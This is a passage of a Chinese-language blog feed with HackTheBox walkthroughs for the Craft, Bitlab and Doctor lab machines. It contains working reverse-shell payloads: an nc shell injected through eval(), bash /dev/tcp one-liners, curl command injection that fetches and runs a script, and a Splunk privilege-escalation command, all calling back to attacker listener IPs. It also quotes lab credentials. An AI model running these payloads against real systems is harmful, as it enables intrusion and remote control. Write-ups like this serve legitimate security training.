bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)</span><br><span class="line">|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)</span><br><span class="line">|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)</span><br><span class="line">443&#x2F;tcp open  ssl&#x2F;http nginx 1.15.8</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: HEAD OPTIONS GET</span><br><span class="line">|_http-server-header: nginx&#x2F;1.15.8</span><br><span class="line">|_http-title: About</span><br><span class="line">| ssl-cert: Subject: commonName&#x3D;craft.htb&#x2F;organizationName&#x3D;Craft&#x2F;stateOrProvinceName&#x3D;NY&#x2F;countryName&#x3D;US</span><br><span class="line">| Issuer: commonName&#x3D;Craft CA&#x2F;organizationName&#x3D;Craft&#x2F;stateOrProvinceName&#x3D;New York&#x2F;countryName&#x3D;US</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2019-02-06T02:25:47</span><br><span class="line">| Not valid after:  2020-06-20T02:25:47</span><br><span class="line">| MD5:   0111 76e2 83c8 0f26 50e7 56e4 ce16 4766</span><br><span class="line">|_SHA-1: 2e11 62ef 4d2e 366f 196a 51f0 c5ca b8ce 8592 3730</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http&#x2F;1.1</span><br><span class="line">| tls-nextprotoneg: </span><br><span class="line">|_  http&#x2F;1.1</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Read data files from: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;share&#x2F;nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line"># Nmap done at Fri Mar  5 09:16:22 2021 -- 1 IP address (1 host up) scanned in 32.95 seconds</span><br></pre></td></tr></table></figure><p>22端口对应ssh服务，443端口是https服务端口，hostname是craft.htb，在<code>/etc/hosts</code>中加入，然后访问，在源码处又发现</p> <img src="/2021/03/05/Craft-hackthebox/1.png" class=""><p>将这两个hostname添加到<code>/etc/hosts</code>中，访问，一个是python的API接口信息，需要登录；gogs页面上面部署了API接口实现的python脚本和测试文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -p- -oA nmap/craft-allports 10.10.10.110</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.91 scan initiated Fri Mar  5 09:38:29 2021 as: nmap -v -p- -oA nmap&#x2F;craft-allports 10.10.10.110</span><br><span class="line">Nmap scan report for api.craft.htb (10.10.10.110)</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22&#x2F;tcp   open  ssh</span><br><span class="line">443&#x2F;tcp  open  https</span><br><span class="line">6022&#x2F;tcp open  x11</span><br><span class="line">Read data files from: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;share&#x2F;nmap</span><br><span class="line"># Nmap done at Fri Mar  5 09:49:46 2021 -- 1 IP address (1 host up) scanned in 677.78 seconds</span><br></pre></td></tr></table></figure><p>有一个端口扫出，6022，暂时不知道什么用</p><h3 id="get漏洞点"><a href="#get漏洞点" class="headerlink" title="get漏洞点"></a>get漏洞点</h3><p><code>https://gogs.craft.htb/Craft/craft-api/commit/c414b160578943acfe2e158e89409623f41da4c6</code>路径下找到了存在的漏洞点，这里的eval()可以进行命令执行</p> <img src="/2021/03/05/Craft-hackthebox/2.png" class=""><p><code>https://gogs.craft.htb/Craft/craft-api/src/master/tests/test.py</code>下有一个测试脚本</p><p><code>https://gogs.craft.htb/Craft/craft-api/commit/a2d28ed1554adddfcfb845879bfea09f976ab7c1</code>下找到了测试的数据，用这个测试以及测试数据，尝试命令执行注入</p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">'https://api.craft.htb/api/auth/login'</span>,  auth=(<span class="string">'dinesh'</span>,<span class="string">'4aUh0A8PbVJxgd'</span>), verify=<span class="literal">False</span>)</span><br><span class="line">json_response = json.loads(response.text)</span><br><span class="line">token =  json_response[<span class="string">'token'</span>]</span><br><span class="line"></span><br><span class="line">headers = &#123; <span class="string">'X-Craft-API-Token'</span>: token, <span class="string">'Content-Type'</span>: <span class="string">'application/json'</span>  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># make sure token is valid</span></span><br><span class="line">response = requests.get(<span class="string">'https://api.craft.htb/api/auth/check'</span>, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># create a sample brew with bogus ABV... should fail.</span></span><br><span class="line">print(<span class="string">"Create bogus ABV brew"</span>)</span><br><span class="line">brew_dict = &#123;&#125;</span><br><span class="line">brew_dict[<span class="string">'abv'</span>] = <span class="string">"__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin -i 2&gt;&amp;1|nc 10.10.14.38 1111 &gt;/tmp/f')"</span></span><br><span class="line">brew_dict[<span class="string">'name'</span>] = <span class="string">'bullshit'</span></span><br><span class="line">brew_dict[<span class="string">'brewer'</span>] = <span class="string">'bullshit'</span></span><br><span class="line">brew_dict[<span class="string">'style'</span>] = <span class="string">'bullshit'</span></span><br><span class="line">json_data = json.dumps(brew_dict)</span><br><span class="line">response = requests.post(<span class="string">'https://api.craft.htb/api/brew/'</span>, headers=headers, data=json_data, verify=<span class="literal">False</span>)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><p><code>abv</code>参数处自己找一个python反弹shell的命令替换即可</p> <img src="/2021/03/05/Craft-hackthebox/3.png" class=""><p>获取的是docker容器中的root权限，在当前目录下有一个dbtest.py文件，查看一下</p> <img src="/2021/03/05/Craft-hackthebox/4.png" class=""><h3 id="获取用户权限"><a href="#获取用户权限" class="headerlink" title="获取用户权限"></a>获取用户权限</h3><p>修改<code>dbtest.py</code>中的查询语句就能够获取数据库里的信息，这里有一个user表，可以查到用户账号信息和密码</p> <img src="/2021/03/05/Craft-hackthebox/5.png" class=""><p>三个账户ssh都无法连接，第三个在gogs上成功登录，并且在个人发布的内容中发现了公钥和私钥</p> <img src="/2021/03/05/Craft-hackthebox/6.png" class=""><p>将文件下载到本地，ssh连接，需要密码，用上面的密码,成功连接</p> <img src="/2021/03/05/Craft-hackthebox/7.png" class=""><h3 id="root权限"><a href="#root权限" class="headerlink" title="root权限"></a>root权限</h3><p>在之前的账户界面发现了secret.sh，里面是一个Secrets Engines密码引擎，<a href="https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords" target="_blank" rel="noopener">文章</a></p><p>跟着文章里的做</p><p>很奇怪这里用了能找到了方法就是连不上，google看的国外大神的做法一样的操作就是连不上，借用一张成功的图，这台靶机就到这了</p> <img src="/2021/03/05/Craft-hackthebox/8.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是一台有关python的靶机，学习新知识点为主
    
    </summary>
    
    
    
      <category term="渗透meduim" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8Fmeduim/"/>
    
  </entry>
  
  <entry>
    <title>Bitlab-hackthebox</title>
    <link href="http://yoursite.com/2021/03/03/Bitlab-hackthebox/"/>
    <id>http://yoursite.com/2021/03/03/Bitlab-hackthebox/</id>
    <published>2021-03-03T03:29:16.000Z</published>
    <updated>2021-03-03T08:29:53.513Z</updated>
    
    <content type="html"><![CDATA[<p>时隔许久，继续<a id="more"></a></p> <img src="/2021/03/03/Bitlab-hackthebox/11.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本机：10.10.14.38</span><br><span class="line">靶机：10.10.10.114</span><br></pre></td></tr></table></figure><h3 id="nmap探端口"><a href="#nmap探端口" class="headerlink" title="nmap探端口"></a>nmap探端口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -sC -sV -oA nmap&#x2F;bitlab 10.10.10.114</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.91 scan initiated Wed Mar  3 10:43:15 2021 as: nmap -v -sC -sV -oA nmap&#x2F;bitlab 10.10.10.114</span><br><span class="line">Nmap scan report for 10.10.10.114</span><br><span class="line">Host is up (0.29s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)</span><br><span class="line">|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)</span><br><span class="line">|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    nginx</span><br><span class="line">|_http-favicon: Unknown favicon MD5: F7E3D97F404E71D302B3239EEF48D5F2</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">| http-robots.txt: 55 disallowed entries (15 shown)</span><br><span class="line">| &#x2F; &#x2F;autocomplete&#x2F;users &#x2F;search &#x2F;api &#x2F;admin &#x2F;profile </span><br><span class="line">| &#x2F;dashboard &#x2F;projects&#x2F;new &#x2F;groups&#x2F;new &#x2F;groups&#x2F;*&#x2F;edit &#x2F;users &#x2F;help </span><br><span class="line">|_&#x2F;s&#x2F; &#x2F;snippets&#x2F;new &#x2F;snippets&#x2F;*&#x2F;edit</span><br><span class="line">| http-title: Sign in \xC2\xB7 GitLab</span><br><span class="line">|_Requested resource was http:&#x2F;&#x2F;10.10.10.114&#x2F;users&#x2F;sign_in</span><br><span class="line">|_http-trane-info: Problem with XML parsing of &#x2F;evox&#x2F;about</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Read data files from: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;share&#x2F;nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line"># Nmap done at Wed Mar  3 10:43:50 2021 -- 1 IP address (1 host up) scanned in 34.29 seconds</span><br></pre></td></tr></table></figure><p>开放了22和80端口，分别是ssh和web服务，可以直接访问地址，是GitLab的登录界面，存在一个robots.txt界面，访问，有很多目录，但是不知道哪些是有用的，还是用gobuster路径爆破跑</p><h3 id="gobuster目录爆破"><a href="#gobuster目录爆破" class="headerlink" title="gobuster目录爆破"></a>gobuster目录爆破</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;10.10.10.114  -w &#x2F;opt&#x2F;SecLists&#x2F;Discovery&#x2F;Web-Content&#x2F;raft-small-words.txt -o gobuster&#x2F;bitlab -s 200,204,301,307,401,403</span><br></pre></td></tr></table></figure><p>这里因为会返回一个302状态码阻止爆破，就把这个状态码去掉</p><p>这里有发现<code>http://10.10.10.114/help</code>下有一个html界面，查看源码发现有<code>js</code>代码</p><img src="/2021/03/03/Bitlab-hackthebox/2.png" class=""><p><code>google javascript prettify</code>，<a href="https://beautifiler.io" target="_blank" rel="noopener">代码美化</a>，放入浏览器控制台</p> <img src="/2021/03/03/Bitlab-hackthebox/3.png" class=""><p>拿到了登录的用户名和密码</p><h3 id="页面信息收集"><a href="#页面信息收集" class="headerlink" title="页面信息收集"></a>页面信息收集</h3><p>登录之后会发现用户拥有两个存储库，其中一个存在<code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$input = file_get_contents(<span class="string">"php://input"</span>);</span><br><span class="line">$payload  = json_decode($input);</span><br><span class="line">$repo = $payload-&gt;project-&gt;name ?? <span class="string">''</span>;</span><br><span class="line">$event = $payload-&gt;event_type ?? <span class="string">''</span>;</span><br><span class="line">$state = $payload-&gt;object_attributes-&gt;state ?? <span class="string">''</span>;</span><br><span class="line">$branch = $payload-&gt;object_attributes-&gt;target_branch ?? <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> ($repo==<span class="string">'Profile'</span> &amp;&amp; $branch==<span class="string">'master'</span> &amp;&amp; $event==<span class="string">'merge_request'</span> &amp;&amp; $state==<span class="string">'merged'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> shell_exec(<span class="string">'cd ../profile/; sudo git pull'</span>),<span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"OK\n"</span>;</span><br></pre></td></tr></table></figure><p>逻辑很清晰，只要满足if条件那么就会进入配置文件夹执行git pull，自动将分支中的更改合并倒配置文件中，应该存在git pull漏洞，进行尝试</p> <img src="/2021/03/03/Bitlab-hackthebox/5.png" class=""><p>shell成功上传，并且能够执行命令</p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash+-c++'bash+-i+&gt;%26+/dev/tcp/10.10.14.38/9001+0&gt;%261'</span><br></pre></td></tr></table></figure><p>进行url编码之后，可以弹回shell</p> <img src="/2021/03/03/Bitlab-hackthebox/6.png" class=""><p>查看sudo的权限</p> <img src="/2021/03/03/Bitlab-hackthebox/7.png" class=""><p>在<code>/home/clave</code>下发现了user.txt，但是权限太低了</p><p>前面网页有一个文件有关数据库</p> <img src="/2021/03/03/Bitlab-hackthebox/8.png" class=""><h3 id="User权限"><a href="#User权限" class="headerlink" title="User权限"></a>User权限</h3><p>Postgresql获取信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$db_connection = pg_connect(<span class="string">"host=localhost dbname=profiles user=profiles password=profiles"</span>);</span><br><span class="line">$result = pg_query($db_connection, <span class="string">"SELECT * FROM profiles"</span>);</span><br><span class="line">print_r(pg_fetch_all($result));</span><br></pre></td></tr></table></figure><p>本地用python起一个web环境，在反弹的shell里用wget下载</p> <img src="/2021/03/03/Bitlab-hackthebox/9.png" class=""><p>接着直接su切换用户，user.txt到手</p> <img src="/2021/03/03/Bitlab-hackthebox/10.png" class=""><h3 id="Root权限"><a href="#Root权限" class="headerlink" title="Root权限"></a>Root权限</h3><p>和反弹shell差不多，<a href="https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks" target="_blank" rel="noopener">git pull漏洞</a></p><p>靶机里复制一份profile下的所有文件，写一个反弹shell，同样的方法下载到靶机里的<code>profile/.git/hooks</code>路径下，网页再次创建新文件，然后利用<code>sudo git pull</code>获得root权限</p> <img src="/2021/03/03/Bitlab-hackthebox/12.png" class=""><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>学习到了git pull漏洞</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;时隔许久，继续
    
    </summary>
    
    
    
      <category term="渗透" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>doctor-hackthebox</title>
    <link href="http://yoursite.com/2021/02/15/doctor-hackthebox/"/>
    <id>http://yoursite.com/2021/02/15/doctor-hackthebox/</id>
    <published>2021-02-15T14:07:29.000Z</published>
    <updated>2021-03-06T13:46:45.802Z</updated>
    
    <content type="html"><![CDATA[<p>easy难度，用来巩固一下前面学到的东西刚好合适<a id="more"></a></p><img src="/2021/02/15/doctor-hackthebox/11.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶机：10.10.10.209</span><br><span class="line">本机：10.10.14.6</span><br></pre></td></tr></table></figure><h3 id="nmap探端口"><a href="#nmap探端口" class="headerlink" title="nmap探端口"></a>nmap探端口</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -sC -sV -oA nmap/doctor 10.10.10.209</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.91 scan initiated Mon Feb 15 22:18:21 2021 as: nmap -v -sC -sV -oA nmap/doctor 10.10.10.209</span><br><span class="line">Nmap scan report for 10.10.10.209 (10.10.10.209)</span><br><span class="line">Host is up (0.27s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)</span><br><span class="line">|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)</span><br><span class="line">|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET POST OPTIONS HEAD</span><br><span class="line">|_http-title: Doctor</span><br><span class="line">8089/tcp open  unknown</span><br><span class="line">| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser</span><br><span class="line">| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2020-09-06T15:57:27</span><br><span class="line">| Not valid after:  2023-09-06T15:57:27</span><br></pre></td></tr></table></figure><p>已有的信息得知这是一个<code>SplunkServer</code>，访问一下8089端口</p><img src="/2021/02/15/doctor-hackthebox/1.png" class=""><p>没有什么有用的信息，尝试<code>gobuster</code>爆破一下路径信息</p><h3 id="Gobuster爆破"><a href="#Gobuster爆破" class="headerlink" title="Gobuster爆破"></a>Gobuster爆破</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.10.10.209  -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -o gobuster/doctor</span><br></pre></td></tr></table></figure><img src="/2021/02/15/doctor-hackthebox/2.png" class=""><p>没有什么隐藏的路径，回来看网页，找到一个邮件地址<code>info@doctors.htb</code>,根据经验，这个<code>doctor.htb</code>应该是可以访问的，在<code>/etc/hosts</code>里加上</p><h3 id="页面信息收集"><a href="#页面信息收集" class="headerlink" title="页面信息收集"></a>页面信息收集</h3><img src="/2021/02/15/doctor-hackthebox/3.png" class=""><p>是一个登录界面，可以注册，随便注册登录一下，注册之后有提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your account has been created, with a time limit of twenty minutes! </span><br><span class="line">&#x2F;&#x2F;说明cookie被设置了有效时间</span><br></pre></td></tr></table></figure><p>登录之后发现可以发公告，一般来说能发公告都是存在XSS的漏洞点，但是测试了没有想到利用方式，反倒想到利用这个发公告，放一个本机链接，看看能不能弹回什么信息</p><img src="/2021/02/15/doctor-hackthebox/4.png" class=""><p>看到这可以想到这里应该是类似<code>curl $(comment)</code>的形式写的代码</p><p>那应该就可以反弹shell了</p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>测试发现可以构造嵌套curl将文件下载到靶机上，本地写一个反弹shell的文件，先下载后监听端口反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#test</span><br><span class="line">bash -c &#39;bash -i &amp;&gt; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.6&#x2F;9001 0&gt;&amp;1&#39;</span><br></pre></td></tr></table></figure><p>然后发布内容，本地python起一个<code>http.server</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">下载</span></span><br><span class="line">http://10.10.14.6/$(curl$IFS'-o'$IFS'/var/www/html/test'$IFS'http://10.10.14.6/test')</span><br></pre></td></tr></table></figure><img src="/2021/02/15/doctor-hackthebox/5.png" class=""><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">反弹shell</span><br><span class="line">http://10.10.14.6/$(bash$IFS'/var/www/html/test')</span><br></pre></td></tr></table></figure><p>之后再获取交互式shell</p><img src="/2021/02/15/doctor-hackthebox/6.png" class=""><p>找到了user.txt，但是只有shaun有权限进行读取</p><img src="/2021/02/15/doctor-hackthebox/7.png" class=""><h3 id="获取user权限"><a href="#获取user权限" class="headerlink" title="获取user权限"></a>获取user权限</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user shaun -ls 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>尝试找有关shaun用户的关联文件，没有找到有用的</p><p>在<code>/var/log/apache2</code>路径下发现有备份文件，那么可能存在日志备份了用户的信息，筛选查看</p><img src="/2021/02/15/doctor-hackthebox/8.png" class=""><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat backup | grep pass</span><br><span class="line"><span class="meta">#</span><span class="bash">10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] <span class="string">"POST /reset_password?email=Guitar123"</span> 500 453 <span class="string">"http://doctor.htb/reset_password"</span></span></span><br></pre></td></tr></table></figure><p>找到了一条重置密码的记录，可能就是shaun用户重置之后的登录密码，切换用户，成功登录shaun用户</p><p>用户权限到手</p><img src="/2021/02/15/doctor-hackthebox/9.png" class=""><h3 id="提权ROOT权限"><a href="#提权ROOT权限" class="headerlink" title="提权ROOT权限"></a>提权ROOT权限</h3><p>这部分提权用到最开始发现的<code>SplunkServer</code>服务，github上可以找到对应的提权工具<a href="https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2" target="_blank" rel="noopener">SplunkWhisperer2</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --lhost 10.10.14.6 --lport 90 shaun --password Guitar123 --payload "bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.6/9002 0&gt;&amp;1'"</span><br></pre></td></tr></table></figure><img src="/2021/02/15/doctor-hackthebox/10.png" class=""><p>成功弹回shell，拿到了root权限</p><p>实际上这题easy是因为真正的点在python的SSTI模板注入，这样就能直接利用模板注入获取shell，待填坑</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;easy难度，用来巩固一下前面学到的东西刚好合适
    
    </summary>
    
    
    
      <category term="渗透easy" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8Feasy/"/>
    
  </entry>
  
</feed>
